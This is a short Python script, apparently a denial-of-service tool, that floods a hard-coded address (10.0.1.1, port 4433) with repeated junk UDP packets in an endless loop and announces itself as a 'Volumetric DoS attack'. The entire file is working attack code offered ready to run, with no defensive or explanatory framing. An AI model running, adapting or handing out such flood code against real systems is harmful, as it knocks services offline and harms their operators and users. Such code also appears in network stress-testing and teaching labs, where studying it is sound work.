import socket

def start_flood(target_ip, target_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #create a socket UDP
    payload = b"DOS_ATTACK_PAYLOAD" * 10 #Junk payload to saturate the server


    print(f"[*] Starting Volumetric DoS attack against {target_ip}:{target_port}...")
    print("[*] Press Ctrl+C to stop the attack.")

    packets = 0
    try:
        while True:
            sock.sendto(payload, (target_ip, target_port))
            packets += 1
            if packets % 5000 == 0:
                print(f"[!] Sent {packets} packets...")
    except KeyboardInterrupt:
        print(f"\n[*] Attack stopped. Total packets sent: {packets}")

if __name__ == "__main__":
    start_flood("10.0.1.1", 4433)
